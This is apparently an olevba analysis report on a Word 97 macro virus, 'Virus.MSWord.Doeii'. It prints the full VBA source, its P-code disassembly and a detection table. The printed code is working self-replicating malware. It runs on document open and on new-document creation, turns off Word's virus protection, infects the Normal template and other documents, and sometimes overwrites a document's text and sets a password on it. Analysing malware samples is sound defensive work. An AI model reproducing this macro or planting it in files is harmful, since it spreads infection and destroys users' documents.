olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Doeii
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Doeii - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Randomize Timer
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Set Normalcl = NormalTemplate.VBProject.VBComponents(1).codemodule
Set Activecl = ActiveDocument.VBProject.VBComponents(1).codemodule
If Normalcl.countoflines > 0 Then GoTo InfecteerDeHap
viruscode = Activecl.lines(1, Activecl.countoflines)
Normalcl.insertlines 1, viruscode
InfecteerDeHap:
If Activecl.countoflines > 0 Then GoTo Doeii
viruscode = Normalcl.lines(1, Normalcl.countoflines)
Activecl.insertlines 1, viruscode
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, Fileformat:=wdDocument
Doeii:
x = Int(Rnd * 100)
If x = 11 Then MsgBox "w97.LAM€ by LiFEwiRE [www.shadowvx.org]", , "...::LiFEwiRE::..."
If x = 25 Then ActiveDocument.Content = "LiFEwiRE2000 - www.shadowvx.org": ActiveDocument.Password = "pietje"
With ActiveDocument.VBProject.VBComponents.Item(1).codemodule
.ReplaceLine 39, "Sub ToolsMacro()"
.ReplaceLine 40, "'(c) LiFEwiRE 2000"
.ReplaceLine 42, "Sub ViewVBCode()"
.ReplaceLine 43, "'www.coderz.net - www.shadowvx.org"
End With
'(c) 2OOO by LiFEwiRE... writt3n 4g4inst my phucking 3x-sk3wl... i c4n c0de ring0 p0ly P3 1nf3ct0rs, but w0rd is 4 b3tt3r
't4rg3t in w97... I kn0w this c0d3 w0n't spr34d 0utzide sk3wl, wh0 cares? Th3 b3tt3r!
End Sub

Private Sub Document_new()
Set Normalcl = NormalTemplate.VBProject.VBComponents(1).codemodule
Set Activecl = ActiveDocument.VBProject.VBComponents(1).codemodule
viruscode = Normalcl.lines(1, Normalcl.countoflines)
Activecl.insertlines 1, viruscode
ActiveDocument.Saved = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Doeii
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3489 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #6:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set Normalcl 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set Activecl 
' Line #8:
' 	Ld Normalcl 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo InfecteerDeHap 
' 	EndIf 
' Line #9:
' 	LitDI2 0x0001 
' 	Ld Activecl 
' 	MemLd countoflines 
' 	Ld Activecl 
' 	ArgsMemLd lines 0x0002 
' 	St viruscode 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld viruscode 
' 	Ld Normalcl 
' 	ArgsMemCall insertlines 0x0002 
' Line #11:
' 	Label InfecteerDeHap 
' Line #12:
' 	Ld Activecl 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo Doeii 
' 	EndIf 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld Normalcl 
' 	MemLd countoflines 
' 	Ld Normalcl 
' 	ArgsMemLd lines 0x0002 
' 	St viruscode 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld viruscode 
' 	Ld Activecl 
' 	ArgsMemCall insertlines 0x0002 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdDocument 
' 	ParamNamed Fileformat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #16:
' 	Label Doeii 
' Line #17:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #18:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0027 "w97.LAM€ by LiFEwiRE [www.shadowvx.org]"
' 	ParamOmitted 
' 	LitStr 0x0012 "...::LiFEwiRE::..."
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #19:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "LiFEwiRE2000 - www.shadowvx.org"
' 	Ld ActiveDocument 
' 	MemSt Content 
' 	BoS 0x0000 
' 	LitStr 0x0006 "pietje"
' 	Ld ActiveDocument 
' 	MemSt Password 
' 	EndIf 
' Line #20:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #21:
' 	LitDI2 0x0027 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #22:
' 	LitDI2 0x0028 
' 	LitStr 0x0012 "'(c) LiFEwiRE 2000"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #23:
' 	LitDI2 0x002A 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #24:
' 	LitDI2 0x002B 
' 	LitStr 0x0022 "'www.coderz.net - www.shadowvx.org"
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #25:
' 	EndWith 
' Line #26:
' 	QuoteRem 0x0000 0x0078 "(c) 2OOO by LiFEwiRE... writt3n 4g4inst my phucking 3x-sk3wl... i c4n c0de ring0 p0ly P3 1nf3ct0rs, but w0rd is 4 b3tt3r"
' Line #27:
' 	QuoteRem 0x0000 0x0054 "t4rg3t in w97... I kn0w this c0d3 w0n't spr34d 0utzide sk3wl, wh0 cares? Th3 b3tt3r!"
' Line #28:
' 	EndSub 
' Line #29:
' Line #30:
' 	FuncDefn (Private Sub Document_new())
' Line #31:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set Normalcl 
' Line #32:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd codemodule 
' 	Set Activecl 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld Normalcl 
' 	MemLd countoflines 
' 	Ld Normalcl 
' 	ArgsMemLd lines 0x0002 
' 	St viruscode 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld viruscode 
' 	Ld Activecl 
' 	ArgsMemCall insertlines 0x0002 
' Line #35:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #36:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

